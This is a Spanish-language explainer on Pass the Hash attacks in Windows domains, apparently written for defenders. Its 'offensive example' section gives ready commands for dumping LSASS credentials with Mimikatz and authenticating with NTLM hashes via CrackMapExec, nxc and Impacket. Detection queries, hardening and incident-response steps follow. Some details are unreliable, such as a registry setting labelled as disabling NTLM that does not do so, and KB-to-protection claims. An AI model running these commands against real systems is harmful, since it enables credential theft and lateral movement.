# 🔑 Pass the Hash - Autenticación con hashes NTLM sin contraseñas

---

## 📝 ¿Qué es Pass the Hash y por qué es tan crítico?

| Concepto      | Descripción                                                                                                 |
|---------------|------------------------------------------------------------------------------------------------------------|
| **Definición**| Técnica que permite a un atacante autenticarse en sistemas remotos usando hashes NTLM sin conocer la contraseña en texto plano. Aprovecha el protocolo NTLM que acepta hashes como credencial válida. |
| **Uso**       | Herramientas como Mimikatz, CrackMapExec, nxc, Impacket y PsExec utilizan esta técnica para movimiento lateral y escalada de privilegios en entornos Windows/Active Directory. |

---

## 🛠️ ¿Cómo funciona el ataque? (paso a paso real)

| Fase             | Acción                                                                                                          |
|------------------|-----------------------------------------------------------------------------------------------------------------|
| **Extracción**   | El atacante obtiene hashes NTLM desde memoria (LSASS), archivos SAM, NTDS.dit o mediante ataques de volcado.   |
| **Validación**   | Verifica que los hashes extraídos sean válidos y funcionales para autenticación.                                |
| **Autenticación**| Utiliza el hash NTLM directamente en el protocolo NTLM para autenticarse sin descifrar la contraseña.          |
| **Movimiento**   | Se conecta a sistemas remotos usando los hashes para ejecutar comandos, acceder a recursos o establecer sesiones.|
| **Persistencia** | Mantiene acceso usando las credenciales hash en múltiples sistemas de la red.                                   |

---

## 💻 Ejemplo ofensivo (comandos reales)

```bash
# Extracción de hashes con Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Pass the Hash con CrackMapExec
crackmapexec smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# Pass the Hash con nxc
nxc smb 192.168.1.10 -u administrador -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Pass the Hash con Impacket
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Pass the Hash para WMI
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10

# Secretsdump para extraer más hashes
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c administrador@192.168.1.10
```

---

## 📊 Detección en Splunk

| Evento clave | Descripción                                                                                                   |
|--------------|--------------------------------------------------------------------------------------------------------------|
| **4624**     | Inicio de sesión exitoso con tipo 3 (red) usando autenticación NTLM.                                        |
| **4776**     | Autenticación NTLM exitosa con misma cuenta desde múltiples IPs.                                             |
| **4768/4769**| Solicitudes Kerberos anómalas cuando se mezclan con NTLM (posible fallback).                                 |
| **4648**     | Inicio de sesión con credenciales explícitas (runas/pass the hash).                                          |
| **4625**     | Fallos de autenticación previos que preceden a autenticaciones exitosas sospechosas.                         |
| **5140**     | Acceso a recursos compartidos administrativos tras autenticación con hash.                                    |
| **4634**     | Cierre de sesión tras actividades de movimiento lateral.                                                     |

### Query Splunk esencial

```splunk
index=dc_logs EventCode=4624
| search Logon_Type=3 Authentication_Package=NTLM
| stats count dc(Source_Network_Address) as IPs_unicas by Account_Name, _time
| where IPs_unicas > 3
| sort -count
```

### Query para detectar patrones Pass the Hash

```splunk
index=dc_logs (EventCode=4624 OR EventCode=4776)
| search Authentication_Package=NTLM
| bin _time span=5m
| stats count dc(ComputerName) as sistemas_accedidos, list(ComputerName) as sistemas by Account_Name, _time
| where sistemas_accedidos >= 3
| table _time, Account_Name, sistemas_accedidos, sistemas
```

### Query para correlacionar extracción y uso de hashes

```splunk
index=security_logs (EventCode=4624 OR EventCode=4648 OR EventCode=10)
| search (Process_Name="*mimikatz*" OR Process_Name="*lsass*" OR Logon_Type=9)
| stats list(EventCode) as eventos, min(_time) as inicio, max(_time) as fin by Account_Name, ComputerName
| table inicio, fin, Account_Name, ComputerName, eventos
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// Pass the Hash - Detección de logons con hash
DeviceLogonEvents
| where LogonType == "Network" 
| where AuthenticationPackageName == "NTLM"
| summarize LogonCount = count(), UniqueDevices = dcount(DeviceId) by AccountName, bin(Timestamp, 5m)
| where LogonCount > 5 or UniqueDevices > 3
| order by LogonCount desc
```

```kql
// Detección de herramientas de extracción de credenciales
DeviceProcessEvents
| where ProcessCommandLine has_any ("mimikatz", "sekurlsa", "lsadump", "crackmapexec", "psexec") and ProcessCommandLine has_any ("-hashes", "::logonpasswords", "pass-the-hash")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```kql
// Detección de acceso a LSASS sospechoso
DeviceProcessEvents
| where InitiatingProcessFileName !in ("winlogon.exe", "csrss.exe", "wininit.exe")
| where ProcessCommandLine has "lsass" or FileName == "lsass.exe"
| join kind=inner (DeviceFileEvents | where FileName == "lsass.exe") on DeviceId
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, ProcessCommandLine
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **NTLM Lateral Movement** | Múltiples logons NTLM desde una cuenta en poco tiempo | Alta |
| **Credential Extraction Tools** | Detección de Mimikatz y herramientas similares | Crítica |
| **LSASS Access** | Acceso no autorizado al proceso LSASS | Alta |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de Pass the Hash basado en logons NTLM
event_platform=Win event_simpleName=UserLogon 
| search LogonType=3 AuthenticationPackageName=NTLM
| bin _time span=5m
| stats dc(ComputerName) as unique_systems, count as total_logons by UserName, _time
| where unique_systems > 3 OR total_logons > 10
| sort - unique_systems
```

```sql
-- Detección de herramientas de Pass the Hash
event_platform=Win event_simpleName=ProcessRollup2 
| search (CommandLine=*crackmapexec* OR CommandLine=*psexec* OR CommandLine=*wmiexec*) AND CommandLine=*-hashes*
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de acceso a memoria LSASS
event_platform=Win event_simpleName=ProcessAccess
| search TargetProcessName=*lsass.exe GrantedAccess=*PROCESS_VM_READ*
| search NOT SourceProcessName IN (csrss.exe, winlogon.exe, wininit.exe, services.exe)
| table _time, ComputerName, SourceProcessName, TargetProcessName, GrantedAccess
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar movimiento lateral rápido
event_platform=Win event_simpleName=NetworkConnectIP4
| search RemotePort IN (135, 139, 445, 3389)
| bin _time span=1m
| stats dc(RemoteAddressIP4) as unique_destinations by ComputerName, UserName, _time
| where unique_destinations > 5
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de Pass the Hash

```kql
// Query principal para detectar Pass the Hash
SecurityEvent
| where EventID == 4624
| where LogonType == 3 and AuthenticationPackageName == "NTLM"
| where Account !endswith "$"
| summarize LogonCount = count(), UniqueComputers = dcount(Computer) by Account, IpAddress, bin(TimeGenerated, 5m)
| where LogonCount > 5 or UniqueComputers > 2
| order by LogonCount desc
```

```kql
// Correlación con eventos de extracción de credenciales
SecurityEvent
| where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine contains "mimikatz" or ProcessCommandLine contains "lsadump"
    | project TimeGenerated, DeviceName, ProcessCommandLine, AccountName
) on $left.Account == $right.AccountName
| project TimeGenerated, Computer, ProcessCommandLine, Account, IpAddress
| where TimeGenerated1 > TimeGenerated // Pass the Hash después de extracción
```

### Hunting avanzado

```kql
// Detección de patrones de movimiento lateral
SecurityEvent
| where EventID in (4624, 4625)
| where LogonType == 3
| summarize SuccessfulLogons = countif(EventID == 4624), FailedLogons = countif(EventID == 4625), UniqueComputers = dcount(Computer) by Account, IpAddress, bin(TimeGenerated, 10m)
| where UniqueComputers > 3 and SuccessfulLogons > 5
| order by UniqueComputers desc
```

```kql
// Detección de uso de shares administrativos tras Pass the Hash
SecurityEvent
| where EventID == 5140 // Acceso a share de red
| where ShareName in ("ADMIN$", "C$", "IPC$")
| join kind=inner (
    SecurityEvent
    | where EventID == 4624 and LogonType == 3 and AuthenticationPackageName == "NTLM"
    | project TimeGenerated, Account, Computer, IpAddress
) on Computer, Account
| where TimeGenerated1 > TimeGenerated and TimeGenerated1 - TimeGenerated < 1h
| project TimeGenerated1, Computer, Account, ShareName, IpAddress
```

---

## 🦾 Hardening y mitigación

| Medida                                  | Descripción                                                                                      |
|------------------------------------------|-------------------------------------------------------------------------------------------------|
| **Credential Guard**                     | Activa Windows Defender Credential Guard para proteger credenciales en memoria.                 |
| **LSASS Protection**                     | Habilita LSA Protection para prevenir acceso no autorizado al proceso LSASS.                    |
| **Privileged Access Workstations (PAW)**| Utiliza estaciones de trabajo dedicadas para administradores privilegiados.                     |
| **Kerberos Authentication**              | Fuerza el uso de Kerberos sobre NTLM siempre que sea posible.                                   |
| **Network Level Authentication**         | Requiere autenticación antes de establecer sesiones RDP completas.                              |
| **Restricted Admin Mode**                | Activa modo administrador restringido para RDP y PowerShell remoto.                             |
| **Account Tiering**                      | Implementa modelo de niveles para cuentas administrativas (Tier 0, 1, 2).                       |
| **Regular Password Changes**             | Cambia contraseñas de cuentas privilegiadas regularmente para invalidar hashes.                  |

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5025221** | Windows 11 22H2 - Mejoras en Windows Defender Credential Guard contra extracción de hashes. |
| **KB5025175** | Windows 10 22H2 - Fortalecimiento de protección LSASS y mitigación Pass the Hash.           |
| **KB5022906** | Windows Server 2022 - Mejoras en LSA Protection y auditoría de autenticación NTLM.          |
| **KB5022845** | Windows Server 2019 - Correcciones en manejo de credenciales y protección de memoria.       |
| **KB4580390** | Windows Server 2016 - Parches de seguridad para prevención de volcado de credenciales.      |
| **TPM 2.0 Firmware** | Actualizaciones de firmware TPM para mejorar Credential Guard y Device Guard.     |

### Configuraciones de registro recomendadas

```powershell
# Habilitar Credential Guard
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "LsaCfgFlags" -Value 1

# Activar LSA Protection
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1

# Deshabilitar NTLM cuando sea posible
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0" -Name "NtlmMinClientSec" -Value 0x20000000
```

### Actualizaciones críticas de seguridad

- **CVE-2022-26925**: Vulnerabilidad LSA que facilita extracción de credenciales (KB5014754)
- **CVE-2021-36934**: HiveNightmare - acceso no autorizado a archivos SAM (KB5005101)  
- **CVE-2020-1472**: Zerologon - bypass de autenticación que facilita Pass the Hash (KB4556836)
- **CVE-2019-1384**: Vulnerabilidad en Kerberos que permite extracción de hashes (KB4524244)

---

## 🚨 Respuesta ante incidentes

1. **Aísla inmediatamente** las cuentas sospechosas que muestran patrones de Pass the Hash.
2. **Cambia contraseñas** de todas las cuentas comprometidas para invalidar los hashes.
3. **Identifica el vector inicial** de compromiso (cómo se extrajeron los hashes).
4. **Mapea el movimiento lateral** correlacionando eventos 4624/4776 en múltiples sistemas.
5. **Busca persistencia** creada durante el período de compromiso activo.
6. **Reinicia sistemas comprometidos** para limpiar credenciales en memoria.
7. **Implementa monitoreo adicional** en sistemas afectados por 30-60 días.

---

## 💡 Soluciones innovadoras

- **Honeyhashes:** Crea cuentas trampa con hashes monitoreados que alerten su uso.
- **Memory Analysis Continuous:** Monitoreo continuo de memoria LSASS para detectar extracción de credenciales.
- **Behavioral Analytics:** Detecta patrones anómalos de autenticación basados en ubicación, horario y frecuencia.
- **Hash Rotation:** Rotación automática de hashes de cuentas de servicio cada 24-48 horas.
- **Lateral Movement Traps:** Sistemas trampa que alertan ante intentos de acceso con credenciales robadas.

---

## ⚡ CVEs y técnicas MITRE relevantes

- **T1550.002 (Pass the Hash):** Uso de hashes NTLM para autenticación
- **T1003.001 (LSASS Memory):** Extracción de credenciales desde memoria LSASS
- **T1021.002 (SMB/Windows Admin Shares):** Movimiento lateral usando hashes
- **CVE-2022-26925:** Vulnerabilidad LSA que facilita extracción de credenciales
- **CVE-2021-42278/42287 (sAMAccountName spoofing):** Escalada que puede facilitar Pass the Hash

---

## 📚 Referencias

- [Mimikatz - Credential Extraction](https://github.com/gentilkiwi/mimikatz)
- [CrackMapExec Pass the Hash](https://github.com/Porchetta-Industries/CrackMapExec)
- [Impacket Examples](https://github.com/fortra/impacket)
- [Microsoft - Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
- [NIST - Pass the Hash Mitigation](https://www.nist.gov/cybersecurity)
- [MITRE ATT&CK - T1550.002](https://attack.mitre.org/techniques/T1550/002/)